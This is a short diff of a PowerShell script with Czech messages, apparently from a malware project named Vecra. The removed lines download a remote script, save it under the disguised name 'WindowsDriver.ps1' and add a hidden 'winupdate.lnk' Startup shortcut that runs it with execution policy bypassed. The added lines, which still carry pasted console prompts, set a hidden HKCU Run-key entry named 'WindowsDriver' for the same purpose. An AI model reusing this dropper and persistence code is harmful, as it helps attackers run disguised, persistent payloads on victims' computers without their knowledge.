@@ -1,13 +1,15 @@
-Add-Content -Path "$env:TEMP\vecra_debug.log" -Value "Skript spuštěn: $(Get-Date)"
-
-# 1. Stáhni payload
-$payloadUrl = "https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra1.ps1"
-$localPath = "$env:APPDATA\WindowsDriver.ps1"
-Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath
-
-$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.lnk"
-$wsh = New-Object -ComObject WScript.Shell
-$shortcut = $wsh.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
-$shortcut.Save()
+$scriptPath = "$env:APPDATA\SchedTas.ps1"
+>> $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+>> $regName = "WindowsDriver"
+>>
+>> try {
+>>     Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+>>     $check = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
+>>     if ($check.$regName) {
+>>         Write-Host "[+] Skript přidán do HKCU\Run."
+>>     } else {
+>>         Write-Host "[-] Nepodařilo se ověřit zápis do registru."
+>>     }
+>> } catch {
+>>     Write-Host "[-] Chyba při zápisu do registru: $_"
+>> }
